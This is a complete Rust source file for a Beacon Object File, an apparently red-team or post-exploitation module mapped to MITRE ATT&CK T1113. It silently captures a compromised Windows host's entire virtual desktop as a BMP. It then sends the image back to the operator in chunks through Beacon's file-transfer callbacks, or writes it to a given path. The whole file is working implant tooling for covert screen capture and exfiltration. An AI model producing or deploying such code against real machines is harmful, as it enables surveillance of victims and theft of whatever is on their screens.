//! # Screenshot BOF
//!
//! Captures the current virtual desktop through GDI and returns a 32-bit BMP
//! through Beacon's file-transfer protocol. An optional output path supports
//! standalone COFF loaders; the default mode does not create a temporary file.
//!
//! ## MITRE ATT&CK
//! - T1113 - Screen Capture
//!
//! ## Arguments
//! - Optional `str`: output path for standalone COFF loaders that do not
//!   implement Beacon's file-transfer protocol. With no argument, the BOF
//!   returns `screenshot.bmp` through the normal Beacon protocol.

#![no_std]

use alloc::{string::String, vec};
use rustbof::data::DataParser;
use rustbof::{eprintln, println};
use windows_sys::Win32::{
    Foundation::{CloseHandle, GENERIC_WRITE, GetLastError, INVALID_HANDLE_VALUE},
    Graphics::Gdi::{
        BI_RGB, BITMAPINFO, BITMAPINFOHEADER, BitBlt, CreateCompatibleBitmap, CreateCompatibleDC,
        DIB_RGB_COLORS, DeleteDC, DeleteObject, GetDC, GetDIBits, ReleaseDC, SRCCOPY, SelectObject,
    },
    Storage::FileSystem::{
        CREATE_ALWAYS, CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, WriteFile,
    },
    UI::WindowsAndMessaging::{
        GetSystemMetrics, SM_CXVIRTUALSCREEN, SM_CYVIRTUALSCREEN, SM_XVIRTUALSCREEN,
        SM_YVIRTUALSCREEN,
    },
};

const BMP_FILE_HEADER_SIZE: usize = 14;
const MAX_CAPTURE_BYTES: usize = 128 * 1024 * 1024;
const CALLBACK_FILE: i32 = 0x02;
const CALLBACK_FILE_WRITE: i32 = 0x08;
const CALLBACK_FILE_CLOSE: i32 = 0x09;
const DOWNLOAD_CHUNK_BYTES: usize = 512 * 1024;

unsafe extern "C" {
    fn BeaconOutput(callback: i32, data: *const u8, length: i32);
}

fn append_u16(buffer: &mut alloc::vec::Vec<u8>, value: u16) {
    buffer.extend_from_slice(&value.to_le_bytes());
}

fn append_u32(buffer: &mut alloc::vec::Vec<u8>, value: u32) {
    buffer.extend_from_slice(&value.to_le_bytes());
}

fn capture() -> Result<(alloc::vec::Vec<u8>, i32, i32), &'static str> {
    let x = unsafe { GetSystemMetrics(SM_XVIRTUALSCREEN) };
    let y = unsafe { GetSystemMetrics(SM_YVIRTUALSCREEN) };
    let width = unsafe { GetSystemMetrics(SM_CXVIRTUALSCREEN) };
    let height = unsafe { GetSystemMetrics(SM_CYVIRTUALSCREEN) };
    if width <= 0 || height <= 0 {
        return Err("virtual desktop dimensions are unavailable");
    }

    let pixels = (width as usize)
        .checked_mul(height as usize)
        .and_then(|value| value.checked_mul(4))
        .ok_or("capture dimensions overflow")?;
    if pixels > MAX_CAPTURE_BYTES {
        return Err("virtual desktop exceeds the capture size limit");
    }

    unsafe {
        let screen = GetDC(core::ptr::null_mut());
        if screen.is_null() {
            return Err("GetDC failed");
        }
        let memory = CreateCompatibleDC(screen);
        if memory.is_null() {
            ReleaseDC(core::ptr::null_mut(), screen);
            return Err("CreateCompatibleDC failed");
        }
        let bitmap = CreateCompatibleBitmap(screen, width, height);
        if bitmap.is_null() {
            DeleteDC(memory);
            ReleaseDC(core::ptr::null_mut(), screen);
            return Err("CreateCompatibleBitmap failed");
        }

        let previous = SelectObject(memory, bitmap);
        if previous.is_null() || BitBlt(memory, 0, 0, width, height, screen, x, y, SRCCOPY) == 0 {
            if !previous.is_null() {
                SelectObject(memory, previous);
            }
            DeleteObject(bitmap);
            DeleteDC(memory);
            ReleaseDC(core::ptr::null_mut(), screen);
            return Err("BitBlt failed");
        }

        let mut info: BITMAPINFO = core::mem::zeroed();
        info.bmiHeader = BITMAPINFOHEADER {
            biSize: size_of::<BITMAPINFOHEADER>() as u32,
            biWidth: width,
            biHeight: height,
            biPlanes: 1,
            biBitCount: 32,
            biCompression: BI_RGB,
            biSizeImage: pixels as u32,
            biXPelsPerMeter: 0,
            biYPelsPerMeter: 0,
            biClrUsed: 0,
            biClrImportant: 0,
        };
        let mut pixel_data = vec![0u8; pixels];
        let copied = GetDIBits(
            memory,
            bitmap,
            0,
            height as u32,
            pixel_data.as_mut_ptr() as *mut core::ffi::c_void,
            &mut info,
            DIB_RGB_COLORS,
        );

        SelectObject(memory, previous);
        DeleteObject(bitmap);
        DeleteDC(memory);
        ReleaseDC(core::ptr::null_mut(), screen);
        if copied != height {
            return Err("GetDIBits failed");
        }

        let offset = BMP_FILE_HEADER_SIZE + size_of::<BITMAPINFOHEADER>();
        let total = offset.checked_add(pixels).ok_or("BMP size overflow")?;
        let mut output = alloc::vec::Vec::with_capacity(total);
        output.extend_from_slice(b"BM");
        append_u32(&mut output, total as u32);
        append_u16(&mut output, 0);
        append_u16(&mut output, 0);
        append_u32(&mut output, offset as u32);
        let header = core::slice::from_raw_parts(
            &info.bmiHeader as *const BITMAPINFOHEADER as *const u8,
            size_of::<BITMAPINFOHEADER>(),
        );
        output.extend_from_slice(header);
        output.extend_from_slice(&pixel_data);

        Ok((output, width, height))
    }
}

fn write_capture(path: &str, image: &[u8]) -> Result<(), u32> {
    if path.is_empty() || path.len() > 1024 || path.contains('\0') {
        return Err(87);
    }

    let path_wide = path
        .encode_utf16()
        .chain(core::iter::once(0))
        .collect::<alloc::vec::Vec<_>>();
    let file = unsafe {
        CreateFileW(
            path_wide.as_ptr(),
            GENERIC_WRITE,
            FILE_SHARE_READ,
            core::ptr::null(),
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            core::ptr::null_mut(),
        )
    };
    if file == INVALID_HANDLE_VALUE {
        return Err(unsafe { GetLastError() });
    }

    let mut offset = 0usize;
    while offset < image.len() {
        let remaining = image.len() - offset;
        let requested = remaining.min(u32::MAX as usize) as u32;
        let mut written = 0u32;
        let success = unsafe {
            WriteFile(
                file,
                image.as_ptr().add(offset),
                requested,
                &mut written,
                core::ptr::null_mut(),
            )
        };
        if success == 0 || written == 0 {
            let error = unsafe { GetLastError() };
            unsafe { CloseHandle(file) };
            return Err(error);
        }
        offset += written as usize;
    }

    unsafe { CloseHandle(file) };
    Ok(())
}

fn append_be_u32(buffer: &mut alloc::vec::Vec<u8>, value: u32) {
    buffer.extend_from_slice(&value.to_be_bytes());
}

fn send_capture(filename: &str, image: &[u8]) -> Result<(), &'static str> {
    let length = u32::try_from(image.len()).map_err(|_| "capture is too large to download")?;
    let file_id = (image.as_ptr() as usize as u32) ^ length ^ 0x4152_4D59;

    let mut open = alloc::vec::Vec::with_capacity(8 + filename.len());
    append_be_u32(&mut open, file_id);
    append_be_u32(&mut open, length);
    open.extend_from_slice(filename.as_bytes());
    unsafe { BeaconOutput(CALLBACK_FILE, open.as_ptr(), open.len() as i32) };

    let mut chunk = alloc::vec::Vec::with_capacity(4 + DOWNLOAD_CHUNK_BYTES);
    for bytes in image.chunks(DOWNLOAD_CHUNK_BYTES) {
        chunk.clear();
        append_be_u32(&mut chunk, file_id);
        chunk.extend_from_slice(bytes);
        unsafe { BeaconOutput(CALLBACK_FILE_WRITE, chunk.as_ptr(), chunk.len() as i32) };
    }

    let close = file_id.to_be_bytes();
    unsafe { BeaconOutput(CALLBACK_FILE_CLOSE, close.as_ptr(), close.len() as i32) };
    Ok(())
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let output_path = if args.is_null() || len == 0 {
        String::new()
    } else {
        let mut parser = DataParser::new(args, len);
        String::from(parser.get_str())
    };

    match capture() {
        Ok((image, width, height)) => {
            if !output_path.is_empty() {
                match write_capture(&output_path, &image) {
                    Ok(()) => println!(
                        "[+] Screenshot captured: {}x{} | {} bytes | {}",
                        width,
                        height,
                        image.len(),
                        output_path
                    ),
                    Err(error) => eprintln!("[-] Screenshot write failed: {}", error),
                }
            } else {
                match send_capture("screenshot.bmp", &image) {
                    Ok(()) => println!(
                        "[+] Screenshot captured: {}x{} | {} bytes | screenshot.bmp",
                        width,
                        height,
                        image.len()
                    ),
                    Err(error) => eprintln!("[-] Screenshot download failed: {}", error),
                }
            }
        }
        Err(error) => eprintln!("[-] Screenshot failed: {}", error),
    }
}
